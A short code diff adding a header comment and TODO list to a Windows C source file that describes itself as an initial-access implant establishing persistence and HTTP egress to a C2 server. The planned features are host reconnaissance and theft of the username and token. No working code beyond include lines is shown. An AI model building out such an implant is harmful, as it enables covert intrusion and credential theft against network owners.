@@ -1,3 +1,21 @@
+/**************************************
+ * This exe provides initial access
+ * to a target network by establishing
+ * persistence and http egress with the
+ * linked C2 server
+ * ***********************************/
+
+// TODO
+// Read environment variables
+// List network interfaces
+// Get Windows Version
+// Retrieve username + token
+// Retrieve computer name
+// Retrieve machine GUID
+// List files in directory
+// Change directory
+// List running processes
+
 #include <tchar.h>
 #include <windows.h>
 #include <stdio.h>
